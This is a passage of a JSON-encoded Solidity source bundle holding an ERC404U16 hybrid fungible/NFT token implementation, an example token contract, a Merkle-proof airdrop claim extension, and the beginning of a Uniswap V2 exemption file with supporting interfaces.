ERC-721 transfers with contract support and callback data.\\n  /// This function only supports moving valid ERC-721 ids, as it does not exist on the\\n  /// ERC-20 spec and will revert otherwise.\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_,\\n    bytes memory data_\\n  ) public virtual {\\n    if (!_isValidTokenId(id_)) {\\n      revert InvalidTokenId();\\n    }\\n\\n    transferFrom(from_, to_, id_);\\n\\n    if (\\n      to_.code.length != 0 &&\\n      IERC721Receiver(to_).onERC721Received(msg.sender, from_, id_, data_) !=\\n      IERC721Receiver.onERC721Received.selector\\n    ) {\\n      revert UnsafeRecipient();\\n    }\\n  }\\n\\n  /// @notice Function for EIP-2612 permits\\n  /// @dev Providing type(uint256).max for permit value results in an\\n  ///      unlimited approval that is not deducted from on transfers.\\n  function permit(\\n    address owner_,\\n    address spender_,\\n    uint256 value_,\\n    uint256 deadline_,\\n    uint8 v_,\\n    bytes32 r_,\\n    bytes32 s_\\n  ) public virtual {\\n    if (deadline_ < block.timestamp) {\\n      revert PermitDeadlineExpired();\\n    }\\n\\n    if (_isValidTokenId(value_)) {\\n      revert InvalidApproval();\\n    }\\n\\n    if (spender_ == address(0)) {\\n      revert InvalidSpender();\\n    }\\n\\n    unchecked {\\n      address recoveredAddress = ecrecover(\\n        keccak256(\\n          abi.encodePacked(\\n            \\\"\\\\x19\\\\x01\\\",\\n            DOMAIN_SEPARATOR(),\\n            keccak256(\\n              abi.encode(\\n                keccak256(\\n                  \\\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\\\"\\n                ),\\n                owner_,\\n                spender_,\\n                value_,\\n                nonces[owner_]++,\\n                deadline_\\n              )\\n            )\\n          )\\n        ),\\n        v_,\\n        r_,\\n        s_\\n      );\\n\\n      if (recoveredAddress == address(0) || recoveredAddress != owner_) {\\n        revert InvalidSigner();\\n      }\\n\\n      allowance[recoveredAddress][spender_] = value_;\\n    }\\n\\n    emit ERC20Events.Approval(owner_, spender_, value_);\\n  }\\n\\n  /// @notice Returns domain initial domain separator, or recomputes if chain id is not equal to initial chain id\\n  function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\\n    return\\n      block.chainid == _INITIAL_CHAIN_ID\\n        ? _INITIAL_DOMAIN_SEPARATOR\\n        : _computeDomainSeparator();\\n  }\\n\\n  function supportsInterface(\\n    bytes4 interfaceId\\n  ) public view virtual returns (bool) {\\n    return\\n      interfaceId == type(IERC404).interfaceId ||\\n      interfaceId == type(IERC165).interfaceId;\\n  }\\n\\n  /// @notice Function for self-exemption\\n  function setSelfERC721TransferExempt(bool state_) public virtual {\\n    _setERC721TransferExempt(msg.sender, state_);\\n  }\\n\\n  /// @notice Function to check if address is transfer exempt\\n  function erc721TransferExempt(\\n    address target_\\n  ) public view virtual returns (bool) {\\n    return target_ == address(0) || _erc721TransferExempt[target_];\\n  }\\n\\n  /// @notice For a token token id to be considered valid, it just needs\\n  ///         to fall within the range of possible token ids, it does not\\n  ///         necessarily have to be minted yet.\\n  function _isValidTokenId(uint256 id_) internal pure returns (bool) {\\n    return id_ > ID_ENCODING_PREFIX && id_ != type(uint256).max;\\n  }\\n\\n  /// @notice Internal function to compute domain separator for EIP-2612 permits\\n  function _computeDomainSeparator() internal view virtual returns (bytes32) {\\n    return\\n      keccak256(\\n        abi.encode(\\n          keccak256(\\n            \\\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\\\"\\n          ),\\n          keccak256(bytes(name)),\\n          keccak256(\\\"1\\\"),\\n          block.chainid,\\n          address(this)\\n        )\\n      );\\n  }\\n\\n  /// @notice This is the lowest level ERC-20 transfer function, which\\n  ///         should be used for both normal ERC-20 transfers as well as minting.\\n  /// Note that this function allows transfers to and from 0x0.\\n  function _transferERC20(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) internal virtual {\\n    // Minting is a special case for which we should not check the balance of\\n    // the sender, and we should increase the total supply.\\n    if (from_ == address(0)) {\\n      totalSupply += value_;\\n    } else {\\n      // Deduct value from sender's balance.\\n      balanceOf[from_] -= value_;\\n    }\\n\\n    // Update the recipient's balance.\\n    // Can be unchecked because on mint, adding to totalSupply is checked, and on transfer balance deduction is checked.\\n    unchecked {\\n      balanceOf[to_] += value_;\\n    }\\n\\n    emit ERC20Events.Transfer(from_, to_, value_);\\n  }\\n\\n  /// @notice Consolidated record keeping function for transferring ERC-721s.\\n  /// @dev Assign the token to the new owner, and remove from the old owner.\\n  /// Note that this function allows transfers to and from 0x0.\\n  /// Does not handle ERC-721 exemptions.\\n  function _transferERC721(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) internal virtual {\\n    // If this is not a mint, handle record keeping for transfer from previous owner.\\n    if (from_ != address(0)) {\\n      // On transfer of an NFT, any previous approval is reset.\\n      delete getApproved[id_];\\n\\n      uint256 updatedId = ID_ENCODING_PREFIX +\\n        _owned[from_][_owned[from_].length - 1];\\n      if (updatedId != id_) {\\n        uint256 updatedIndex = _getOwnedIndex(id_);\\n        // update _owned for sender\\n        _owned[from_][updatedIndex] = uint16(updatedId);\\n        // update index for the moved id\\n        _setOwnedIndex(updatedId, updatedIndex);\\n      }\\n\\n      // pop\\n      _owned[from_].pop();\\n    }\\n\\n    // Check if this is a burn.\\n    if (to_ != address(0)) {\\n      // If not a burn, update the owner of the token to the new owner.\\n      // Update owner of the token to the new owner.\\n      _setOwnerOf(id_, to_);\\n      // Push token onto the new owner's stack.\\n      _owned[to_].push(uint16(id_));\\n      // Update index for new owner's stack.\\n      _setOwnedIndex(id_, _owned[to_].length - 1);\\n    } else {\\n      // If this is a burn, reset the owner of the token to 0x0 by deleting the token from _ownedData.\\n      delete _ownedData[id_];\\n    }\\n\\n    emit ERC721Events.Transfer(from_, to_, id_);\\n  }\\n\\n  /// @notice Internal function for ERC-20 transfers. Also handles any ERC-721 transfers that may be required.\\n  // Handles ERC-721 exemptions.\\n  function _transferERC20WithERC721(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) internal virtual returns (bool) {\\n    uint256 erc20BalanceOfSenderBefore = erc20BalanceOf(from_);\\n    uint256 erc20BalanceOfReceiverBefore = erc20BalanceOf(to_);\\n\\n    _transferERC20(from_, to_, value_);\\n\\n    // Preload for gas savings on branches\\n    bool isFromERC721TransferExempt = erc721TransferExempt(from_);\\n    bool isToERC721TransferExempt = erc721TransferExempt(to_);\\n\\n    // Skip _withdrawAndStoreERC721 and/or _retrieveOrMintERC721 for ERC-721 transfer exempt addresses\\n    // 1) to save gas\\n    // 2) because ERC-721 transfer exempt addresses won't always have/need ERC-721s corresponding to their ERC20s.\\n    if (isFromERC721TransferExempt && isToERC721TransferExempt) {\\n      // Case 1) Both sender and recipient are ERC-721 transfer exempt. No ERC-721s need to be transferred.\\n      // NOOP.\\n    } else if (isFromERC721TransferExempt) {\\n      // Case 2) The sender is ERC-721 transfer exempt, but the recipient is not. Contract should not attempt\\n      //         to transfer ERC-721s from the sender, but the recipient should receive ERC-721s\\n      //         from the bank/minted for any whole number increase in their balance.\\n      // Only cares about whole number increments.\\n      uint256 tokensToRetrieveOrMint = (balanceOf[to_] / units) -\\n        (erc20BalanceOfReceiverBefore / units);\\n      for (uint256 i = 0; i < tokensToRetrieveOrMint; ) {\\n        _retrieveOrMintERC721(to_);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n    } else if (isToERC721TransferExempt) {\\n      // Case 3) The sender is not ERC-721 transfer exempt, but the recipient is. Contract should attempt\\n      //         to withdraw and store ERC-721s from the sender, but the recipient should not\\n      //         receive ERC-721s from the bank/minted.\\n      // Only cares about whole number increments.\\n      uint256 tokensToWithdrawAndStore = (erc20BalanceOfSenderBefore / units) -\\n        (balanceOf[from_] / units);\\n      for (uint256 i = 0; i < tokensToWithdrawAndStore; ) {\\n        _withdrawAndStoreERC721(from_);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n    } else {\\n      // Case 4) Neither the sender nor the recipient are ERC-721 transfer exempt.\\n      // Strategy:\\n      // 1. First deal with the whole tokens. These are easy and will just be transferred.\\n      // 2. Look at the fractional part of the value:\\n      //   a) If it causes the sender to lose a whole token that was represented by an NFT due to a\\n      //      fractional part being transferred, withdraw and store an additional NFT from the sender.\\n      //   b) If it causes the receiver to gain a whole new token that should be represented by an NFT\\n      //      due to receiving a fractional part that completes a whole token, retrieve or mint an NFT to the recevier.\\n\\n      // Whole tokens worth of ERC-20s get transferred as ERC-721s without any burning/minting.\\n      uint256 nftsToTransfer = value_ / units;\\n      for (uint256 i = 0; i < nftsToTransfer; ) {\\n        // Pop from sender's ERC-721 stack and transfer them (LIFO)\\n        uint256 indexOfLastToken = _owned[from_].length - 1;\\n        uint256 tokenId = ID_ENCODING_PREFIX + _owned[from_][indexOfLastToken];\\n        _transferERC721(from_, to_, tokenId);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n\\n      // If the sender's transaction changes their holding from a fractional to a non-fractional\\n      // amount (or vice versa), adjust ERC-721s.\\n      //\\n      // Check if the send causes the sender to lose a whole token that was represented by an ERC-721\\n      // due to a fractional part being transferred.\\n      if (\\n        erc20BalanceOfSenderBefore / units - erc20BalanceOf(from_) / units >\\n        nftsToTransfer\\n      ) {\\n        _withdrawAndStoreERC721(from_);\\n      }\\n\\n      if (\\n        erc20BalanceOf(to_) / units - erc20BalanceOfReceiverBefore / units >\\n        nftsToTransfer\\n      ) {\\n        _retrieveOrMintERC721(to_);\\n      }\\n    }\\n\\n    return true;\\n  }\\n\\n  /// @notice Internal function for ERC20 minting\\n  /// @dev This function will allow minting of new ERC20s.\\n  ///      If mintCorrespondingERC721s_ is true, and the recipient is not ERC-721 exempt, it will\\n  ///      also mint the corresponding ERC721s.\\n  /// Handles ERC-721 exemptions.\\n  function _mintERC20(address to_, uint256 value_) internal virtual {\\n    /// You cannot mint to the zero address (you can't mint and immediately burn in the same transfer).\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    if (totalSupply + value_ > ID_ENCODING_PREFIX) {\\n      revert MintLimitReached();\\n    }\\n\\n    _transferERC20WithERC721(address(0), to_, value_);\\n  }\\n\\n  /// @notice Internal function for ERC-721 minting and retrieval from the bank.\\n  /// @dev This function will allow minting of new ERC-721s up to the total fractional supply. It will\\n  ///      first try to pull from the bank, and if the bank is empty, it will mint a new token.\\n  /// Does not handle ERC-721 exemptions.\\n  function _retrieveOrMintERC721(address to_) internal virtual {\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    uint256 id;\\n\\n    if (!_storedERC721Ids.empty()) {\\n      // If there are any tokens in the bank, use those first.\\n      // Pop off the end of the queue (FIFO).\\n      id = ID_ENCODING_PREFIX + _storedERC721Ids.popBack();\\n    } else {\\n      // Otherwise, mint a new token, should not be able to go over the total fractional supply.\\n      ++minted;\\n\\n      // Reserve max uint256 for approvals\\n      if (minted == type(uint256).max) {\\n        revert MintLimitReached();\\n      }\\n\\n      id = ID_ENCODING_PREFIX + minted;\\n    }\\n\\n    address erc721Owner = _getOwnerOf(id);\\n\\n    // The token should not already belong to anyone besides 0x0 or this contract.\\n    // If it does, something is wrong, as this should never happen.\\n    if (erc721Owner != address(0)) {\\n      revert AlreadyExists();\\n    }\\n\\n    // Transfer the token to the recipient, either transferring from the contract's bank or minting.\\n    // Does not handle ERC-721 exemptions.\\n    _transferERC721(erc721Owner, to_, id);\\n  }\\n\\n  /// @notice Internal function for ERC-721 deposits to bank (this contract).\\n  /// @dev This function will allow depositing of ERC-721s to the bank, which can be retrieved by future minters.\\n  // Does not handle ERC-721 exemptions.\\n  function _withdrawAndStoreERC721(address from_) internal virtual {\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Retrieve the latest token added to the owner's stack (LIFO).\\n    uint256 id = ID_ENCODING_PREFIX + _owned[from_][_owned[from_].length - 1];\\n\\n    // Transfer to 0x0.\\n    // Does not handle ERC-721 exemptions.\\n    _transferERC721(from_, address(0), id);\\n\\n    // Record the token in the contract's bank queue.\\n    _storedERC721Ids.pushFront(uint16(id));\\n  }\\n\\n  /// @notice Initialization function to set pairs / etc, saving gas by avoiding mint / burn on unnecessary targets\\n  function _setERC721TransferExempt(\\n    address target_,\\n    bool state_\\n  ) internal virtual {\\n    if (target_ == address(0)) {\\n      revert InvalidExemption();\\n    }\\n\\n    // Adjust the ERC721 balances of the target to respect exemption rules.\\n    // Despite this logic, it is still recommended practice to exempt prior to the target\\n    // having an active balance.\\n    if (state_) {\\n      _clearERC721Balance(target_);\\n    } else {\\n      _reinstateERC721Balance(target_);\\n    }\\n\\n    _erc721TransferExempt[target_] = state_;\\n  }\\n\\n  /// @notice Function to reinstate balance on exemption removal\\n  function _reinstateERC721Balance(address target_) private {\\n    uint256 expectedERC721Balance = erc20BalanceOf(target_) / units;\\n    uint256 actualERC721Balance = erc721BalanceOf(target_);\\n\\n    for (uint256 i = 0; i < expectedERC721Balance - actualERC721Balance; ) {\\n      // Transfer ERC721 balance in from pool\\n      _retrieveOrMintERC721(target_);\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n  }\\n\\n  /// @notice Function to clear balance on exemption inclusion\\n  function _clearERC721Balance(address target_) private {\\n    uint256 erc721Balance = erc721BalanceOf(target_);\\n\\n    for (uint256 i = 0; i < erc721Balance; ) {\\n      // Transfer out ERC721 balance\\n      _withdrawAndStoreERC721(target_);\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n  }\\n\\n  function _getOwnerOf(\\n    uint256 id_\\n  ) internal view virtual returns (address ownerOf_) {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      ownerOf_ := and(data, _BITMASK_ADDRESS)\\n    }\\n  }\\n\\n  function _setOwnerOf(uint256 id_, address owner_) internal virtual {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      data := add(\\n        and(data, _BITMASK_OWNED_INDEX),\\n        and(owner_, _BITMASK_ADDRESS)\\n      )\\n    }\\n\\n    _ownedData[id_] = data;\\n  }\\n\\n  function _getOwnedIndex(\\n    uint256 id_\\n  ) internal view virtual returns (uint256 ownedIndex_) {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      ownedIndex_ := shr(160, data)\\n    }\\n  }\\n\\n  function _setOwnedIndex(uint256 id_, uint256 index_) internal virtual {\\n    uint256 data = _ownedData[id_];\\n\\n    if (index_ > _BITMASK_OWNED_INDEX >> 160) {\\n      revert OwnedIndexOverflow();\\n    }\\n\\n    assembly {\\n      data := add(\\n        and(data, _BITMASK_ADDRESS),\\n        and(shl(160, index_), _BITMASK_OWNED_INDEX)\\n      )\\n    }\\n\\n    _ownedData[id_] = data;\\n  }\\n}\\n\\n//SPDX-License-Identifier: MIT\\ncontract ERC404ExampleU16 is Ownable, ERC404U16 {\\n  constructor(\\n    string memory name_,\\n    string memory symbol_,\\n    uint8 decimals_,\\n    uint256 maxTotalSupplyERC721_,\\n    address initialOwner_,\\n    address initialMintRecipient_\\n  ) ERC404U16(name_, symbol_, decimals_) Ownable(initialOwner_) {\\n    // Do not mint the ERC721s to the initial owner, as it's a waste of gas.\\n    _setERC721TransferExempt(initialMintRecipient_, true);\\n    _mintERC20(initialMintRecipient_, maxTotalSupplyERC721_ * units);\\n  }\\n\\n  function tokenURI(uint256 id_) public pure override returns (string memory) {\\n    return string.concat(\\\"https://example.com/token/\\\", Strings.toString(id_));\\n  }\\n\\n  function setERC721TransferExempt(\\n    address account_,\\n    bool value_\\n  ) external onlyOwner {\\n    _setERC721TransferExempt(account_, value_);\\n  }\\n}\"\r\n    },\r\n    \"contracts/extensions/ERC404MerkleClaim.sol\": {\r\n      \"content\": \"pragma solidity ^0.8.20;\\n\\n\\nlibrary MerkleProof {\\n    /**\\n     *@dev The multiproof provided is not valid.\\n     */\\n    error MerkleProofInvalidMultiproof();\\n\\n    /**\\n     * @dev Returns true if a `leaf` can be proved to be a part of a Merkle tree\\n     * defined by `root`. For this, a `proof` must be provided, containing\\n     * sibling hashes on the branch from the leaf to the root of the tree. Each\\n     * pair of leaves and each pair of pre-images are assumed to be sorted.\\n     */\\n    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {\\n        return processProof(proof, leaf) == root;\\n    }\\n\\n    /**\\n     * @dev Calldata version of {verify}\\n     */\\n    function verifyCalldata(bytes32[] calldata proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {\\n        return processProofCalldata(proof, leaf) == root;\\n    }\\n\\n    /**\\n     * @dev Returns the rebuilt hash obtained by traversing a Merkle tree up\\n     * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt\\n     * hash matches the root of the tree. When processing the proof, the pairs\\n     * of leafs & pre-images are assumed to be sorted.\\n     */\\n    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {\\n        bytes32 computedHash = leaf;\\n        for (uint256 i = 0; i < proof.length; i++) {\\n            computedHash = _hashPair(computedHash, proof[i]);\\n        }\\n        return computedHash;\\n    }\\n\\n    /**\\n     * @dev Calldata version of {processProof}\\n     */\\n    function processProofCalldata(bytes32[] calldata proof, bytes32 leaf) internal pure returns (bytes32) {\\n        bytes32 computedHash = leaf;\\n        for (uint256 i = 0; i < proof.length; i++) {\\n            computedHash = _hashPair(computedHash, proof[i]);\\n        }\\n        return computedHash;\\n    }\\n\\n    /**\\n     * @dev Returns true if the `leaves` can be simultaneously proven to be a part of a Merkle tree defined by\\n     * `root`, according to `proof` and `proofFlags` as described in {processMultiProof}.\\n     *\\n     * CAUTION: Not all Merkle trees admit multiproofs. See {processMultiProof} for details.\\n     */\\n    function multiProofVerify(\\n        bytes32[] memory proof,\\n        bool[] memory proofFlags,\\n        bytes32 root,\\n        bytes32[] memory leaves\\n    ) internal pure returns (bool) {\\n        return processMultiProof(proof, proofFlags, leaves) == root;\\n    }\\n\\n    /**\\n     * @dev Calldata version of {multiProofVerify}\\n     *\\n     * CAUTION: Not all Merkle trees admit multiproofs. See {processMultiProof} for details.\\n     */\\n    function multiProofVerifyCalldata(\\n        bytes32[] calldata proof,\\n        bool[] calldata proofFlags,\\n        bytes32 root,\\n        bytes32[] memory leaves\\n    ) internal pure returns (bool) {\\n        return processMultiProofCalldata(proof, proofFlags, leaves) == root;\\n    }\\n\\n    /**\\n     * @dev Returns the root of a tree reconstructed from `leaves` and sibling nodes in `proof`. The reconstruction\\n     * proceeds by incrementally reconstructing all inner nodes by combining a leaf/inner node with either another\\n     * leaf/inner node or a proof sibling node, depending on whether each `proofFlags` item is true or false\\n     * respectively.\\n     *\\n     * CAUTION: Not all Merkle trees admit multiproofs. To use multiproofs, it is sufficient to ensure that: 1) the tree\\n     * is complete (but not necessarily perfect), 2) the leaves to be proven are in the opposite order they are in the\\n     * tree (i.e., as seen from right to left starting at the deepest layer and continuing at the next layer).\\n     */\\n    function processMultiProof(\\n        bytes32[] memory proof,\\n        bool[] memory proofFlags,\\n        bytes32[] memory leaves\\n    ) internal pure returns (bytes32 merkleRoot) {\\n        // This function rebuilds the root hash by traversing the tree up from the leaves. The root is rebuilt by\\n        // consuming and producing values on a queue. The queue starts with the `leaves` array, then goes onto the\\n        // `hashes` array. At the end of the process, the last hash in the `hashes` array should contain the root of\\n        // the Merkle tree.\\n        uint256 leavesLen = leaves.length;\\n        uint256 proofLen = proof.length;\\n        uint256 totalHashes = proofFlags.length;\\n\\n        // Check proof validity.\\n        if (leavesLen + proofLen != totalHashes + 1) {\\n            revert MerkleProofInvalidMultiproof();\\n        }\\n\\n        // The xxxPos values are \\\"pointers\\\" to the next value to consume in each array. All accesses are done using\\n        // `xxx[xxxPos++]`, which return the current value and increment the pointer, thus mimicking a queue's \\\"pop\\\".\\n        bytes32[] memory hashes = new bytes32[](totalHashes);\\n        uint256 leafPos = 0;\\n        uint256 hashPos = 0;\\n        uint256 proofPos = 0;\\n        // At each step, we compute the next hash using two values:\\n        // - a value from the \\\"main queue\\\". If not all leaves have been consumed, we get the next leaf, otherwise we\\n        //   get the next hash.\\n        // - depending on the flag, either another value from the \\\"main queue\\\" (merging branches) or an element from the\\n        //   `proof` array.\\n        for (uint256 i = 0; i < totalHashes; i++) {\\n            bytes32 a = leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++];\\n            bytes32 b = proofFlags[i]\\n                ? (leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++])\\n                : proof[proofPos++];\\n            hashes[i] = _hashPair(a, b);\\n        }\\n\\n        if (totalHashes > 0) {\\n            if (proofPos != proofLen) {\\n                revert MerkleProofInvalidMultiproof();\\n            }\\n            unchecked {\\n                return hashes[totalHashes - 1];\\n            }\\n        } else if (leavesLen > 0) {\\n            return leaves[0];\\n        } else {\\n            return proof[0];\\n        }\\n    }\\n\\n    /**\\n     * @dev Calldata version of {processMultiProof}.\\n     *\\n     * CAUTION: Not all Merkle trees admit multiproofs. See {processMultiProof} for details.\\n     */\\n    function processMultiProofCalldata(\\n        bytes32[] calldata proof,\\n        bool[] calldata proofFlags,\\n        bytes32[] memory leaves\\n    ) internal pure returns (bytes32 merkleRoot) {\\n        // This function rebuilds the root hash by traversing the tree up from the leaves. The root is rebuilt by\\n        // consuming and producing values on a queue. The queue starts with the `leaves` array, then goes onto the\\n        // `hashes` array. At the end of the process, the last hash in the `hashes` array should contain the root of\\n        // the Merkle tree.\\n        uint256 leavesLen = leaves.length;\\n        uint256 proofLen = proof.length;\\n        uint256 totalHashes = proofFlags.length;\\n\\n        // Check proof validity.\\n        if (leavesLen + proofLen != totalHashes + 1) {\\n            revert MerkleProofInvalidMultiproof();\\n        }\\n\\n        // The xxxPos values are \\\"pointers\\\" to the next value to consume in each array. All accesses are done using\\n        // `xxx[xxxPos++]`, which return the current value and increment the pointer, thus mimicking a queue's \\\"pop\\\".\\n        bytes32[] memory hashes = new bytes32[](totalHashes);\\n        uint256 leafPos = 0;\\n        uint256 hashPos = 0;\\n        uint256 proofPos = 0;\\n        // At each step, we compute the next hash using two values:\\n        // - a value from the \\\"main queue\\\". If not all leaves have been consumed, we get the next leaf, otherwise we\\n        //   get the next hash.\\n        // - depending on the flag, either another value from the \\\"main queue\\\" (merging branches) or an element from the\\n        //   `proof` array.\\n        for (uint256 i = 0; i < totalHashes; i++) {\\n            bytes32 a = leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++];\\n            bytes32 b = proofFlags[i]\\n                ? (leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++])\\n                : proof[proofPos++];\\n            hashes[i] = _hashPair(a, b);\\n        }\\n\\n        if (totalHashes > 0) {\\n            if (proofPos != proofLen) {\\n                revert MerkleProofInvalidMultiproof();\\n            }\\n            unchecked {\\n                return hashes[totalHashes - 1];\\n            }\\n        } else if (leavesLen > 0) {\\n            return leaves[0];\\n        } else {\\n            return proof[0];\\n        }\\n    }\\n\\n    /**\\n     * @dev Sorts the pair (a, b) and hashes the result.\\n     */\\n    function _hashPair(bytes32 a, bytes32 b) private pure returns (bytes32) {\\n        return a < b ? _efficientHash(a, b) : _efficientHash(b, a);\\n    }\\n\\n    /**\\n     * @dev Implementation of keccak256(abi.encode(a, b)) that doesn't allocate or expand memory.\\n     */\\n    function _efficientHash(bytes32 a, bytes32 b) private pure returns (bytes32 value) {\\n        /// @solidity memory-safe-assembly\\n        assembly {\\n            mstore(0x00, a)\\n            mstore(0x20, b)\\n            value := keccak256(0x00, 0x40)\\n        }\\n    }\\n}\\n\\ninterface IERC404MerkleClaim {\\n  error AirdropAlreadyClaimed();\\n  error NotEligibleForAirdrop();\\n  error AirdropIsClosed();\\n\\n  function verifyProof(\\n    bytes32[] memory proof_,\\n    address claimer_,\\n    uint256 value_\\n  ) external view returns (bool);\\n\\n  function airdropMint(bytes32[] memory proof_, uint256 value_) external;\\n}\\n\\n//SPDX-License-Identifier: MIT\\nabstract contract ERC404MerkleClaim is IERC404MerkleClaim {\\n  bool public airdropIsOpen;\\n  bytes32 public airdropMerkleRoot;\\n  mapping(address => bool) public hasClaimedAirdrop;\\n\\n  modifier whenAirdropIsOpen() {\\n    if (airdropMerkleRoot == 0 || !airdropIsOpen) {\\n      revert AirdropIsClosed();\\n    }\\n    _;\\n  }\\n\\n  function verifyProof(\\n    bytes32[] memory proof_,\\n    address claimer_,\\n    uint256 value_\\n  ) public view returns (bool) {\\n    bytes32 leaf = keccak256(\\n      bytes.concat(keccak256(abi.encode(claimer_, value_)))\\n    );\\n    if (MerkleProof.verify(proof_, airdropMerkleRoot, leaf)) {\\n      return true;\\n    }\\n    return false;\\n  }\\n\\n  // To use, override this function in your contract, call\\n  // super.airdropMint(proof_) within your override function, then mint tokens.\\n  function airdropMint(\\n    bytes32[] memory proof_,\\n    uint256 value_\\n  ) public virtual whenAirdropIsOpen {\\n    _validateAndRecordAirdropClaim(proof_, msg.sender, value_);\\n  }\\n\\n  function _setAirdropMerkleRoot(bytes32 airdropMerkleRoot_) internal {\\n    airdropMerkleRoot = airdropMerkleRoot_;\\n  }\\n\\n  function _toggleAirdropIsOpen() internal {\\n    airdropIsOpen = !airdropIsOpen;\\n  }\\n\\n  function _validateAndRecordAirdropClaim(\\n    bytes32[] memory proof_,\\n    address claimer_,\\n    uint256 value_\\n  ) internal {\\n    // Check that the address is eligible.\\n    if (!verifyProof(proof_, claimer_, value_)) {\\n      revert NotEligibleForAirdrop();\\n    }\\n\\n    // Check if address has already claimed their airdrop.\\n    if (hasClaimedAirdrop[claimer_]) {\\n      revert AirdropAlreadyClaimed();\\n    }\\n\\n    // Mark address as claimed.\\n    hasClaimedAirdrop[claimer_] = true;\\n  }\\n}\"\r\n    },\r\n    \"contracts/extensions/ERC404UniswapV2Exempt.sol\": {\r\n      \"content\": \"pragma solidity ^0.8.20;\\n\\n\\ninterface IERC721Receiver {\\n    /**\\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\\n     * by `operator` from `from`, this function is called.\\n     *\\n     * It must return its Solidity selector to confirm the token transfer.\\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be\\n     * reverted.\\n     *\\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\\n     */\\n    function onERC721Received(\\n        address operator,\\n        address from,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external returns (bytes4);\\n}\\n\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\\ninterface IERC404 {\\n  error NotFound();\\n  error InvalidTokenId();\\n  error AlreadyExists();\\n  error InvalidRecipient();\\n  error InvalidSender();\\n  error InvalidSpender();\\n  error InvalidOperator();\\n  error UnsafeRecipient();\\n  error RecipientIsERC721TransferExempt();\\n  error Unauthorized();\\n  error InsufficientAllowance();\\n  error DecimalsTooLow();\\n  error PermitDeadlineExpired();\\n  error InvalidSigner();\\n  error InvalidApproval();\\n  error OwnedIndexOverflow();\\n  error MintLimitReached();\\n  error InvalidExemption();\\n\\n  function name() external view returns (string memory);\\n  function symbol() external view returns (string memory);\\n  function decimals() external view returns (uint8);\\n  function totalSupply() external view returns (uint256);\\n  function erc20TotalSupply() external view returns (uint256);\\n  function erc721TotalSupply() external view returns (uint256);\\n  function balanceOf(address owner_) external view returns (uint256);\\n  function erc721BalanceOf(address owner_) external view returns (uint256);\\n  function erc20BalanceOf(address owner_) external view returns (uint256);\\n  function erc721TransferExempt(address account_) external view returns (bool);\\n  function isApprovedForAll(\\n    address owner_,\\n    address operator_\\n  ) external view returns (bool);\\n  function allowance(\\n    address owner_,\\n    address spender_\\n  ) external view returns (uint256);\\n  function owned(address owner_) external view returns (uint256[] memory);\\n  function ownerOf(uint256 id_) external view returns (address erc721Owner);\\n  function tokenURI(uint256 id_) external view returns (string memory);\\n  function approve(\\n    address spender_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20Approve(\\n    address spender_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721Approve(address spender_, uint256 id_) external;\\n  function setApprovalForAll(address operator_, bool approved_) external;\\n  function transferFrom(\\n    address from_,\\n    address to_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721TransferFrom(address from_, address to_, uint256 id_) external;\\n  function transfer(address to_, uint256 amount_) external returns (bool);\\n  function getERC721QueueLength() external view returns (uint256);\\n  function getERC721TokensInQueue(\\n    uint256 start_,\\n    uint256 count_\\n  ) external view returns (uint256[] memory);\\n  function setSelfERC721TransferExempt(bool state_) external;\\n  function safeTransferFrom(address from_, address to_, uint256 id_) external;\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_,\\n    bytes calldata data_\\n  ) external;\\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\\n  function permit(\\n    address owner_,\\n    address spender_,\\n    uint256 value_,\\n    uint256 deadline_,\\n    uint8 v_,\\n    bytes32 r_,\\n    bytes32 s_\\n  ) external;\\n}\\n\\nlibrary DoubleEndedQueue {\\n  /**\\n   * @dev An operation (e.g. {front}) couldn't be completed due to the queue being empty.\\n   */\\n  error QueueEmpty();\\n\\n  /**\\n   * @dev A push operation couldn't be completed due to the queue being full.\\n   */\\n  error QueueFull();\\n\\n  /**\\n   * @dev An operation (e.g. {at}) couldn't be completed due to an index being out of bounds.\\n   */\\n  error QueueOutOfBounds();\\n\\n  /**\\n   * @dev Indices are 128 bits so begin and end are packed in a single storage slot for efficient access.\\n   